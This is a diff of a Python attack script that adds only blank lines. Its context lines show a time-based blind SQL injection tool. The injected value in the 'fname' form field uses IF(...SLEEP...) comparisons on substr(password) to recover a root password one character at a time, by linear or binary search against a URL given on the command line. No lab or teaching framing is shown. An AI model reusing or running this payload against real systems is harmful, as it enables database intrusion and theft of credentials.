@@ -49,6 +49,8 @@ def determine_password_length(url:str, timeout=10):
 
     return -1
 
+
+
 def determine_password_request(url:str, 
                                timeout:int,
                                len:int, 
@@ -59,6 +61,8 @@ def determine_password_request(url:str,
     data['fname'] = f"root\' AND IF((SELECT ascii(substr(password,{len},1))) {operator} {char_code}, SLEEP({sleep}),NULL)-- "
     print(f"Attempting to see if ascii-code={char_code}) is '{operator}' than the unknown character at position {len}")
     return make_request(url, data, timeout)
+
+
 
 
 def linear_search_determine_password(url:str, password_len:int, timeout=10):
@@ -72,6 +76,8 @@ def linear_search_determine_password(url:str, password_len:int, timeout=10):
                 print("PASSWORD: " + password)
                 break
     return password
+
+
 
 
 def binary_search_determine_password(url:str, password_len:int, timeout:int=10):
@@ -121,6 +127,8 @@ def binary_search_determine_password(url:str, password_len:int, timeout:int=10):
         password += chr(char_code)
         print("PASSWORD: " + password)
     return password
+
+
 
 url:str = parse_args()
 timeout = 3
